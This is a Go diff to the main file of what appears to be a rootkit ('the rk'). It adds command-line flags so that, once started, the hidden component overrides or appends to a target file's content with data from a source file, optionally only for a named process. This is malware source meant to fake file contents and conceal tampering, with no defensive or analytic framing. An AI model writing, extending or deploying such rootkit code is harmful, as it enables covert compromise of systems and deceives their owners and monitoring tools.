@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"flag"
 	"fmt"
 	"io/ioutil"
@@ -44,12 +45,33 @@ func install() string {
 
 func main() {
 	start := flag.Bool("start", false, "start the rk otherwise install it")
+
+	src := flag.String("src", "", "source file")
+	target := flag.String("target", "", "destination file")
+	add := flag.Bool("append", false, "append mode")
+	comm := flag.String("comm", "", "only for process")
+
 	flag.Parse()
 
 	if *start {
 		fmt.Printf("Starting with pid %d\n", os.Getpid())
 		rkHidden := hidden.NewRkHidden()
 		rkHidden.Start()
+
+		if src != nil && target != nil {
+			file, err := os.Open(*src)
+			if err == nil {
+				defer file.Close()
+				if f, err := ioutil.ReadAll(file); err == nil {
+					var c string
+					if comm != nil {
+						c = *comm
+					}
+
+					rkHidden.OverrideContent("", *target, bytes.NewReader(f), *add, c)
+				}
+			}
+		}
 
 		wait()
 
